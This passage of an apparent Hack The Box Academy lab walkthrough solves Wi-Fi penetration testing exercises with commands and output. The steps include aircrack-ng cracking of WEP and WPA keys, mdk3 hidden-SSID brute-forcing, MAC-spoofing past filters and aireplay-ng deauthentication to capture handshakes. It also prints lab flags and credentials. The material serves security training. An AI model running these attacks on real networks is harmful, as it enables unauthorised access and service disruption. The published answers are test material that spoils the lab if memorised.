[02:20:08:289] [6642:6643] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[02:20:08:590] [6642:6643] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[02:20:08:590] [6642:6643] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[02:20:08:608] [6642:6643] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[02:20:08:608] [6642:6643] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[02:20:08:608] [6642:6643] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use `aircrack-ng` to obtain the WEP key from the `/opt/WEP.ivs` file:

Code: shell

```shell
sudo aircrack-ng -K /opt/WEP.ivs
```

```
wifi@WiFiIntro:~$ sudo aircrack-ng -K /opt/WEP.ivs 

Reading packets, please wait...
Opening /opt/WEP.ivs
Read 567298 packets.

   #  BSSID              ESSID                     Encryption

   1  00:11:95:91:78:8C                            WEP (0 IVs)

Choosing first network as target.

Reading packets, please wait...
Opening /opt/WEP.ivs
Read 567298 packets.

1 potential targets

                               Aircrack-ng 1.6 

                 [00:00:02] Tested 1869 keys (got 566693 IVs)

   KB    depth   byte(vote)
    0    0/  1   AE(  50) 11(  20) 71(  20) 0D(  12) 10(  12) 
    1    1/  2   5B(  31) BD(  18) F8(  17) E6(  16) 35(  15) 
    2    0/  3   7F(  31) 74(  24) 54(  17) 1C(  13) 73(  13) 
    3    0/  1   3A( 148) EC(  20) EB(  16) FB(  13) 81(  12) 
    4    0/  1   03( 140) 90(  31) 4A(  15) 8F(  14) E9(  13) 
    5    0/  1   D0(  69) 04(  27) 60(  24) C8(  24) 26(  20) 
    6    0/  1   AF( 124) D4(  29) C8(  20) EE(  18) 3F(  12) 
    7    0/  1   9B( 168) 90(  24) 72(  22) F5(  21) 11(  20) 
    8    0/  1   F6( 157) EE(  24) 66(  20) DA(  18) E0(  18) 
    9    1/  2   7B(  44) E2(  30) 11(  27) DE(  23) A4(  20) 
   10    1/  1   01(   0) 02(   0) 03(   0) 04(   0) 05(   0) 

             KEY FOUND! [ {hidden} ] 
	Decrypted correctly: 100%
```

Answer: `AE:5B:7F:3A:03:D0:AF:9B:F6:8D:A5:E2:C7`

# Aircrack-ng

## Question 2

### "Utilize Aircrack-ng to crack the WPA key for the ESSID "Coherer" from the file located at "/opt/WPA\_Capture.pcap" and submit the found key as the answer."

Students will reuse the previously established RDP session. Subsequently, they will use `aircrack-ng` and the dictionary list `wordlist.txt` located in `/opt` to obtain the key from the `WPA_Capture.pcap` packet capture, and students will choose the first BSSID (Coherer) and obtain the key:

Code: shell

```shell
sudo aircrack-ng -K /opt/WPA_Capture.pcap -w /opt/wordlist.txt
1
```

```
wifi@WiFiIntro:~$ sudo aircrack-ng -K /opt/WPA_Capture.pcap -w /opt/wordlist.txt

Reading packets, please wait...
Opening /opt/WPA_Capture.pcap
Read 1093 packets.

   #  BSSID              ESSID                     Encryption

   1  00:0C:41:82:B2:55  Coherer                   WPA (1 handshake, with PMKID)
   2  65:78:F7:B7:30:84                            Unknown
   3  65:78:F7:B7:60:A9                            Unknown
   4  81:F8:47:33:56:BB                            Unknown
   5  92:F3:65:74:D2:DB                            Unknown
   6  98:D3:04:64:FA:55                            WPA (0 handshake)
   7  F4:9F:8F:EA:7B:E6                            Unknown
   8  FF:FF:FF:FF:FF:3F                            WEP (0 IVs)

Index number of target network ? 1

Reading packets, please wait...
Opening /opt/WPA_Capture.pcap
Read 1093 packets.

1 potential targets

                               Aircrack-ng 1.6 

      [00:00:00] 515/14344392 keys tested (1789.74 k/s) 

      Time left: 2 hours, 13 minutes, 34 seconds                 0.00%

                           KEY FOUND! [ {hidden} ]

      Master Key     : A2 88 FC F0 CA AA CD A9 A9 F5 86 33 FF 35 E8 99 
                       2A 01 D9 C1 0B A5 E0 2E FD F8 CB 5D 73 0C E7 BC 

      Transient Key  : 0E 92 23 FE 1C 0A ED 8D C9 89 5D D6 A6 E0 92 61 
                       99 AC C6 E7 6D 4D F5 4A 18 D1 D1 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : A4 62 A7 02 9A D5 BA 30 B6 AF 0D F3 91 98 8E 45 
```

Answer: `Induction`

# Connecting to Wi-Fi Networks

## Question 1

### "Connect to the WPA Wi-Fi network named "CyberNet-Secure" with the PSK "Password123!!!!!!". Once connected, locate the flag at the IP address 192.168.1.1."

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-4sgmzpk1d3]─[~]
└──╼ [★]$ xfreerdp /v:10.129.184.196 /u:wifi /p:wifi /dynamic-resolution 

[03:40:36:287] [81935:81936] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[03:40:36:588] [81935:81936] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[03:40:36:588] [81935:81936] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[03:40:36:603] [81935:81936] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[03:40:36:603] [81935:81936] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[03:40:36:603] [81935:81936] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and connect to the `CyberNet-Secure` wireless network for the `ssid` variable using `Password123!!!!!!` as the passphrase for the `psk` variable to create the following configuration file:

Code: shell

```shell
cat << EOF > wpa.conf
network={
	ssid="CyberNet-Secure"
    psk="Password123!!!!!!"
}
EOF
```

```
wifi@WiFiIntro:~$ cat << EOF > wpa.conf
network={
    ssid="CyberNet-Secure"
    psk="Password123!!!!!!"
}
EOF
```

Next, students will utilize `wpa_supplicant` alongside the configuration file:

Code: shell

```shell
sudo wpa_supplicant -c wpa.conf -i wlan0
```

```
wifi@WiFiIntro:~$ sudo wpa_supplicant -c wpa.conf -i wlan0

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan0' UP
nl80211: deinit ifname=p2p-dev-wlan0 disabled_11b_rates=0
p2p-dev-wlan0: Failed to initialize driver interface
p2p-dev-wlan0: CTRL-EVENT-DSCP-POLICY clear_all
P2P: Failed to enable P2P Device interface
wlan0: SME: Trying to authenticate with d8:d6:3d:eb:29:d5 (SSID='CyberNet-Secure' freq=2412 MHz)
wlan0: Trying to associate with d8:d6:3d:eb:29:d5 (SSID='CyberNet-Secure' freq=2412 MHz)
wlan0: Associated with d8:d6:3d:eb:29:d5
wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan0: WPA: Key negotiation completed with d8:d6:3d:eb:29:d5 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to d8:d6:3d:eb:29:d5 completed [id=0 id_str=]
```

Subsequently, students will open a new terminal tab and use `dhclient` to obtain an IP address on the `wlan0` network interface:

Code: shell

```shell
sudo dhclient wlan0
```

```
wifi@WiFiIntro:~$ sudo dhclient wlan0
```

Students will use `curl` to send an HTTP request to `192.168.1.1` to obtain the flag:

Code: shell

```shell
curl http://192.168.1.1
```

```
wifi@WiFiIntro:~$ curl http://192.168.1.1

{hidden}
```

Answer: `HTB{C0NN3cTeD_t0_WPA}`

# Connecting to Wi-Fi Networks

## Question 2

### "Connect to the WEP Wi-Fi network named "HackTheBox-WEP" using the key "1A2B3C4D5E". Once connected, locate the flag at the IP address 192.168.2.1."

Students will reuse the previously established RDP session and terminate the `wpa_supplicant` process with the key combination `Ctrl + C`. Next, students will create a configurational file to connect to the `HackTheBox-WEP` wireless network using the `1A2B3C4D5E`:

Code: shell

```shell
cat << EOF > wep.conf
network={
	ssid="HackTheBox-WEP"
    key_mgmt=NONE
    wep_key0=1A2B3C4D5E
    wep_tx_keyidx=0
}
EOF
```

```
wifi@WiFiIntro:~$ cat << EOF > wep.conf
network={
    ssid="HackTheBox-WEP"
    key_mgmt=NONE
    wep_key0=1A2B3C4D5E
    wep_tx_keyidx=0
}
EOF
```

Subsequently, students will use `wpa_supplicant` to connect using the `wep.conf` configuration file:

Code: shell

```shell
sudo wpa_supplicant -c wep.conf -i wlan0
```

```
wifi@WiFiIntro:~$ sudo wpa_supplicant -c wep.conf -i wlan0

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan0' UP
nl80211: deinit ifname=p2p-dev-wlan0 disabled_11b_rates=0
p2p-dev-wlan0: Failed to initialize driver interface
p2p-dev-wlan0: CTRL-EVENT-DSCP-POLICY clear_all
P2P: Failed to enable P2P Device interface
wlan0: SME: Trying to authenticate with a2:72:98:42:bd:95 (SSID='HackTheBox-WEP' freq=2412 MHz)
wlan0: Trying to associate with a2:72:98:42:bd:95 (SSID='HackTheBox-WEP' freq=2412 MHz)
wlan0: Associated with a2:72:98:42:bd:95
wlan0: CTRL-EVENT-CONNECTED - Connection to a2:72:98:42:bd:95 completed [id=0 id_str=]
wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
```

In the second terminal tab, students will utilize `dhclient` to release the IP address previously assigned on the `wlan0` network interface:

Code: shell

```shell
sudo dhclient wlan0 -r
```

```
wifi@WiFiIntro:~$ sudo dhclient wlan0 -r

Killed old client process
```

Subsequently, students will use `dhclient` again to obtain a new IP address:

Code: shell

```shell
sudo dhclient wlan0
```

```
wifi@WiFiIntro:~$ sudo dhclient wlan0
```

Students will use `curl` to send an HTTP request to `192.168.2.1` and obtain the flag:

Code: shell

```shell
curl http://192.168.2.1
```

```
wifi@WiFiIntro:~$ curl http://192.168.2.1

{hidden}
```

Answer: `HTB{W3p_!s_EasY}`

# Connecting to Wi-Fi Networks

## Question 3

### "Connect to the WPA-Enterprise Wi-Fi network named "HTB-Corp" with username "HTB\\Sentinal" and password "sentinal". Once connected, locate the flag at the IP address 192.168.3.1."

Students will reuse the previously established RDP session and terminate the `wpa_supplicant` process with the key combination `Ctrl + C`. Next, students will create a configurational file to connect to the `HTB-Corp` wireless network with the credentials `HTB\Sentinal:sentinal`:

Code: shell

```shell
cat << EOF > wpa-enterprise.conf
network={
  ssid="HTB-Corp"
  key_mgmt=WPA-EAP
  identity="HTB\Sentinal"
  password="sentinal"
}
EOF
```

```
wifi@WiFiIntro:~$ cat << EOF > wpa-enterprise.conf
network={
  ssid="HTB-Corp"
  key_mgmt=WPA-EAP
  identity="HTB\Sentinal"
  password="sentinal"
}
EOF
```

Subsequently, students will use `wpa_supplicant` to connect using the `wpa-enterprise.conf` configuration file:

Code: shell

```shell
sudo wpa_supplicant -c wpa-enterprise.conf -i wlan0
```

```
wifi@WiFiIntro:~$ sudo wpa_supplicant -c wpa-enterprise.conf -i wlan0

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan0' UP
nl80211: deinit ifname=p2p-dev-wlan0 disabled_11b_rates=0
p2p-dev-wlan0: Failed to initialize driver interface
p2p-dev-wlan0: CTRL-EVENT-DSCP-POLICY clear_all
P2P: Failed to enable P2P Device interface
wlan0: SME: Trying to authenticate with 9c:9a:03:39:bd:71 (SSID='HTB-Corp' freq=2412 MHz)
wlan0: Trying to associate with 9c:9a:03:39:bd:71 (SSID='HTB-Corp' freq=2412 MHz)
wlan0: Associated with 9c:9a:03:39:bd:71
wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan0: CTRL-EVENT-EAP-STARTED EAP authentication started
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan0: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 25 (PEAP) selected
wlan0: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=US/ST=California/L=San Fransisco/O=HTB/CN=htb.com' hash=46b80ecdee1a588b1fed111307a618b8e4429d7cb9e639fe976741e1a1e2b7ae
wlan0: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=US/ST=California/L=San Fransisco/O=HTB/CN=htb.com' hash=46b80ecdee1a588b1fed111307a618b8e4429d7cb9e639fe976741e1a1e2b7ae
EAP-MSCHAPV2: Authentication succeeded
wlan0: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan0: PMKSA-CACHE-ADDED 9c:9a:03:39:bd:71 0
wlan0: WPA: Key negotiation completed with 9c:9a:03:39:bd:71 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to 9c:9a:03:39:bd:71 completed [id=0 id_str=]
```

In the second terminal tab, students will utilize `dhclient` to release the IP address previously assigned on the `wlan0` network interface:

Code: shell

```shell
sudo dhclient wlan0 -r
```

```
wifi@WiFiIntro:~$ sudo dhclient wlan0 -r

Killed old client process
```

Subsequently, students will use `dhclient` again to obtain a new IP address:

Code: shell

```shell
sudo dhclient wlan0
```

```
wifi@WiFiIntro:~$ sudo dhclient wlan0
```

Students will use `curl` to send an HTTP request to `192.168.3.1` and obtain the flag:

Code: shell

```shell
curl http://192.168.3.1
```

```
wifi@WiFiIntro:~$ curl http://192.168.3.1

{hidden}
```

Answer: `HTB{ENT3RPR!SE_C00n3ctED`

# Finding Hidden SSIDs

## Question 1

### "Identify the name of the hidden SSID with the BSSID d8:d6:3d:eb:29:d5 and submit it as your answer."

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-6jc4rgbfvz]─[~]
└──╼ [★]$ xfreerdp /v:10.129.220.220 /u:wifi /p:wifi /dynamic-resolution 

[05:22:59:683] [48823:48824] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[05:22:59:984] [48823:48824] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:22:59:984] [48823:48824] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:22:59:004] [48823:48824] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:22:59:004] [48823:48824] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[05:22:59:004] [48823:48824] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and will utilize `airmon-ng` and `mdk3` to brute-force the SSID by focusing on using the `m` option for lower and upper case characters plus numbers on the `d8:d6:3d:eb:29:d5` BSSID:

Code: shell

```shell
sudo airmon-ng start wlan0
sudo mdk3 wlan0mon p -b m -c 1 -t d8:d6:3d:eb:29:d5
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

<SNIP>

wifi@WiFiIntro:~$ sudo mdk3 wlan0mon p -b m -c 1 -t d8:d6:3d:eb:29:d5

SSID Bruteforce Mode activated!

channel set to: 1
Waiting for beacon frame from target...
Sniffer thread started

SSID is hidden. SSID Length is: 15.

Got response from D8:D6:3D:EB:29:D5, SSID: "{hidden}"
```

Answer: `CyberNet-Secure`

# Finding Hidden SSIDs

## Question 2

### "Identify the name of the hidden SSID with the BSSID a2:a6:32:1b:29:d5 and submit it as your answer."

Students will reuse the previously established RDP session. Subsequently, they will use `mdk3` to brute-force the SSID name of the `a2:a6:32:1b:29:d5` BSSID network, focusing on the upper case option (`u`):

Code: shell

```shell
sudo mdk3 wlan0mon p -b u -c 1 -t a2:a6:32:1b:29:d5
```

```
wifi@WiFiIntro:~$ sudo mdk3 wlan0mon p -b u -c 1 -t a2:a6:32:1b:29:d5

SSID Bruteforce Mode activated!

channel set to: 1
Waiting for beacon frame from target...
Sniffer thread started

SSID is hidden. SSID Length is: 3.

Got response from A2:A6:32:1B:29:D5, SSID: "{hidden}"
```

Answer: `HTB`

# Finding Hidden SSIDs

## Question 3

### "Identify the name of the hidden SSID with the BSSID d2:a3:32:1b:29:d5 and submit it as your answer."

Students will reuse the previously established RDP session. Subsequently, they will utilize `mdk3` to brute-force the SSID name of the `d2:a3:32:1b:29:d5` BSSID network using the `wordlist.txt` dictionary list located in the `/opt` directory:

Code: shell

```shell
sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t d2:a3:32:1b:29:d5
```

```
wifi@WiFiIntro:~$ sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t d2:a3:32:1b:29:d5

SSID Wordlist Mode activated!

Waiting for beacon frame from target...
Sniffer thread started

SSID is hidden. SSID Length is: 8.

Got response from D2:A3:32:1B:29:D5, SSID: "{hidden}"
Last try was: (null)
```

Answer: `FreeWifi`

# Bypassing Mac Filtering

## Question 1

### "What is the ESSID of the WiFi network operating on the 5 GHz band?"

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-lip2psyng5]─[~]
└──╼ [★]$ xfreerdp /v:10.129.202.88 /u:wifi /p:wifi /dynamic-resolution

[02:47:57:187] [123081:123082] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[02:47:58:488] [123081:123082] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[02:47:58:488] [123081:123082] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[02:47:58:501] [123081:123082] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[02:47:58:502] [123081:123082] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[02:47:58:502] [123081:123082] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and will use `airmon-ng` to change to the `Monitor` mode on the `wlan0` network adapter:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    183 avahi-daemon
    203 wpa_supplicant
    209 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy5	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy5]wlan0 on [phy5]wlan0mon)
		(mac80211 station mode vif disabled for [phy5]wlan0)
```

Next, students will use `airodump-ng` to scan the wireless networks, focusing on the 5Ghz band using the `--band a` option, while taking note of the available networks, uncovering the 5GHz ESSID name and the clients connected (`STATION` column):

Code: shell

```shell
sudo airodump-ng wlan0mon --band a
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon --band a

 CH 112 ][ Elapsed: 18 s ][ 2024-10-17 07:52 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -28       13        0    0  48   54   WPA2 CCMP   PSK  {hidden}                                                           

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   9E:61:2E:38:9C:FB  -29    0 - 6     36        5         CyberNet-Secure                                                              
 (not associated)   0A:51:D2:9D:46:EB  -29    0 - 6     34        7         CyberNet-Secure                                                              
 (not associated)   3A:A1:48:F9:49:B3  -29    0 - 1      0        4         CyberNet-Secure                                                              
 (not associated)   0E:1C:5E:09:C5:8D  -29    0 - 1      0        3         CyberNet-Secure
```

Answer: `CyberNet-Secure-5G`

# Bypassing Mac Filtering

## Question 2

### "Execute the MAC Filtering bypass as demonstrated in the section to establish a connection to the 5 GHz band. Once connected, locate the flag at IP address 192.168.2.1."

Students will reuse the previously established RDP session. Additionally, students will terminate the `airodump-ng` process using the key combination `Ctrl + C`. Next, students will use `airmon-ng` to stop the monitoring mode of the wireless adapter `wlan0mon`:

Code: shell

```shell
sudo airmon-ng stop wlan0mon
```

```
wifi@WiFiIntro:~$ sudo airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy5	wlan0mon	htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 station mode vif enabled on [phy5]wlan0)

		(mac80211 monitor mode vif disabled for [phy5]wlan0mon)
```

Students will use `macchanger` to change the MAC address to any of the MAC addresses found in the previous question in the `STATION` column of the output from `airodump-ng`, and will disable the `wlan0` interface, change the MAC address, and they will enable the interface. Note, that the MAC addresses of the clients change upon every spawn of the target:

Code: shell

```shell
sudo ifconfig wlan0 down
sudo macchanger wlan0 -m 9E:61:2E:38:9C:FB
sudo ifconfig wlan0 up
```

```
wifi@WiFiIntro:~$ sudo ifconfig wlan0 down
wifi@WiFiIntro:~$ sudo macchanger wlan0 -m 9E:61:2E:38:9C:FB

Current MAC:   42:00:00:00:05:00 (unknown)
Permanent MAC: 42:00:00:00:05:00 (unknown)
New MAC:       9e:61:2e:38:9c:fb (unknown)

wifi@WiFiIntro:~$ sudo ifconfig wlan0 up
```

Subsequently, students will use `nmcli` to connect to the `CyberNet-Secure-5G` wireless network using the password (`Password123!!!!!!`) found in the section:

Code: shell

```shell
nmcli device wifi connect 'CyberNet-Secure-5G' password 'Password123!!!!!!'
```

```
wifi@WiFiIntro:~$ nmcli device wifi connect 'CyberNet-Secure-5G' password 'Password123!!!!!!'

Device 'wlan0' successfully activated with '62a93cd8-7728-4441-bbd7-e8fb06940de0'.
```

Next, students will use `wget` to download the root webpage located at `192.168.2.1` to attain the flag:

Code: shell

```shell
wget http://192.168.2.1
grep 'HTB{' index.html
```

```
wifi@WiFiIntro:~$ wget http://192.168.2.1

--2024-10-17 08:01:03--  http://192.168.2.1/
Connecting to 192.168.2.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 335 [text/html]
Saving to: ‘index.html’

index.html                             100%[=========================================================================>]     335  --.-KB/s    in 0s      

2024-10-17 08:01:03 (43.5 MB/s) - ‘index.html’ saved [335/335]

wifi@WiFiIntro:~$ grep 'HTB{' index.html 
  		<div class="content-title spacing">{hidden}</div>
```

Answer: `HTB{bfcc811c7b9b4c7cf63c5c2e968e13e0}`

# Wi-Fi Penetration Testing Basics - Skills Assessment

## Question 1

### "What is the name of the WiFi network with the BSSID D8:D6:3D:EB:29:D5?"

Students will establish an RDP connection to the target using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-zgbdtkktod]─[~]
└──╼ [★]$ xfreerdp /v:10.129.205.188 /u:wifi /p:wifi /dynamic-resolution

[05:07:44:547] [14824:14825] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[05:07:44:848] [14824:14825] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:07:44:848] [14824:14825] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:07:44:870] [14824:14825] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:07:44:870] [14824:14825] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[05:07:44:870] [14824:14825] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and will use `airmon-ng` to change to the `Monitor` mode on the `wlan0` network adapter on channel 1:

Code: shell

```shell
sudo airmon-ng start wlan0 1
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0 1

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    183 avahi-daemon
    202 wpa_supplicant
    207 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy5	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy5]wlan0 on [phy5]wlan0mon)
		(mac80211 station mode vif disabled for [phy5]wlan0)
```

Next, students will use `airodump-ng` to scan the available networks, uncovering a network with PSK authentication enabled related to the `D8:D6:3D:EB:29:D5` BSSID using the `wlan0mon` interface:

Code: shell

```shell
sudo airodump-ng wlan0mon
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon

 CH  9 ][ Elapsed: 30 s ][ 2024-10-17 10:14 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D2:A3:32:1B:29:D5  -28      322        0    0   1   54   WPA3 CCMP   SAE  <length:  8>                                                          
 D8:D6:3D:EB:29:D5  -47      322        0    0   1   54   WPA2 CCMP   PSK  {hidden}                                                                   

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  02:00:00:00:02:00  -29    0 - 1      0        1         {hidden}    
```

Answer: `HTB`

# Wi-Fi Penetration Testing Basics - Skills Assessment

## Question 2

### "What is the password for the WiFi network with the BSSID D8:D6:3D:EB:29:D5?"

Students will terminate the `airmon-ng` process with the key combination of `Ctrl + C`, and will initiate it again while saving packets/communication into a file:

Code: shell

```shell
sudo airodump-ng wlan0mon -w AcademyStudent -c 1
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon -w AcademyStudent -c 1

10:17:23  Created capture file "AcademyStudent-01.cap".

CH 10 ][ Elapsed: 36 s ][ 2024-10-17 10:18 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D2:A3:32:1B:29:D5  -28      396        0    0   1   54   WPA3 CCMP   SAE  <length:  8>                                                          
 D8:D6:3D:EB:29:D5  -47      396        2    0   1   54   WPA2 CCMP   PSK  HTB                                                                   

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   56:1E:E0:FB:84:13  -49    0 - 1      4        2                                                                               
 (not associated)   FA:1D:0B:7C:09:B8  -49    0 - 1      4        2                                                                               
 D8:D6:3D:EB:29:D5  02:00:00:00:02:00  -29    0 - 1      0        2         HTB  
```

Students will note the client's MAC address connected to the HTB wireless network and are going to open a new terminal tab and use `airplay-ng` to perform deauthentication to the client with the following `02:00:00:00:02:00` MAC address to capture the handshake:

```shell
sudo aireplay-ng -0 5 -a D8:D6:3D:EB:29:D5 -c 02:00:00:00:02:00 wlan0mon
```
```
wifi@WiFiIntro:~$ sudo aireplay-ng -0 5 -a D8:D6:3D:EB:29:D5 -c 02:00:00:00:02:00 wlan0mon

10:20:26  Waiting for beacon frame (BSSID: D8:D6:3D:EB:29:D5) on channel 1
10:20:26  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 0| 0 ACKs]
10:20:27  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 0| 0 ACKs]
10:20:28  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 0| 0 ACKs]
10:20:29  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 0| 0 ACKs]
10:20:30  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:02:00] [ 0| 0 ACKs]
```

Subsequently, students will stop the `airmon-ng` process with the key combination of `Ctrl + C`, and use `aircrack-ng` to crack the passphrase using the `wordlist.txt` dictionary file located in the current working directory against the `AcademyStudent.cap` packet capture:

```shell
ls -l AcademyStudent*
aircrack-ng AcademyStudent-02.cap -w wordlist.txt 
2
```
```
wifi@WiFiIntro:~$ ls -l AcademyStudent*

-rw-r--r-- 1 root root   1175 Oct 17 10:18 AcademyStudent-01.cap
-rw-r--r-- 1 root root    811 Oct 17 10:18 AcademyStudent-01.csv
-rw-r--r-- 1 root root    844 Oct 17 10:18 AcademyStudent-01.kismet.csv
-rw-r--r-- 1 root root   9194 Oct 17 10:18 AcademyStudent-01.kismet.netxml
-rw-r--r-- 1 root root  83875 Oct 17 10:18 AcademyStudent-01.log.csv
-rw-r--r-- 1 root root  61275 Oct 17 10:21 AcademyStudent-02.cap
-rw-r--r-- 1 root root    811 Oct 17 10:21 AcademyStudent-02.csv
-rw-r--r-- 1 root root    848 Oct 17 10:21 AcademyStudent-02.kismet.csv
-rw-r--r-- 1 root root   9204 Oct 17 10:21 AcademyStudent-02.kismet.netxml
-rw-r--r-- 1 root root 505229 Oct 17 10:21 AcademyStudent-02.log.csv

wifi@WiFiIntro:~$ aircrack-ng AcademyStudent-02.cap -w wordlist.txt 
Reading packets, please wait...
Opening AcademyStudent-02.cap
Read 1332 packets.

   #  BSSID              ESSID                     Encryption

   1  D2:A3:32:1B:29:D5                            Unknown
   2  D8:D6:3D:EB:29:D5  HTB                       WPA (1 handshake)

Index number of target network ? 2

Reading packets, please wait...
Opening AcademyStudent-02.cap
Read 1332 packets.

1 potential targets

                               Aircrack-ng 1.6 

      [00:00:00] 163/14344393 keys tested (947.71 k/s) 

      Time left: 4 hours, 12 minutes, 15 seconds                 0.00%

                           KEY FOUND! [ {hidden} ]

